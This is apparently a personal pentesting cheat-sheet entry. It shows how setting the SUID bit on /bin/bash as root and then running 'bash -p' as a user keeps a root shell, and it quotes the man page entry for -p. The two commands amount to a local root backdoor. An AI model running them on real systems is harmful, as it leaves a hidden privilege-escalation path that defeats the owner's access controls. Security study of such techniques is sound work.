# bash

**Author:** Julien Bongars\
**Date:** 2025-10-13 01:56:12
**Path:**

---

## Escalation

```bash
# root
chmod u+s /bin/bash

# user
/bin/bash -p
```

## Man page

```txt
-p      Turn  on  privileged mode.  In this mode, the shell does not
       read the $ENV and $BASH_ENV files, shell functions  are  not
       inherited from the environment, and the SHELLOPTS, BASHOPTS,
       CDPATH,  and GLOBIGNORE variables, if they appear in the en‐
       vironment, are ignored.  If the shell is  started  with  the
       effective user (group) id not equal to the real user (group)
       id,  and  the  -p  option is not supplied, these actions are
       taken and the effective user id is set to the real user  id.
       If  the -p option is supplied at startup, the effective user
       id is not reset.  Turning this option off causes the  effec‐
       tive user and group ids to be set to the real user and group
       ids.
```
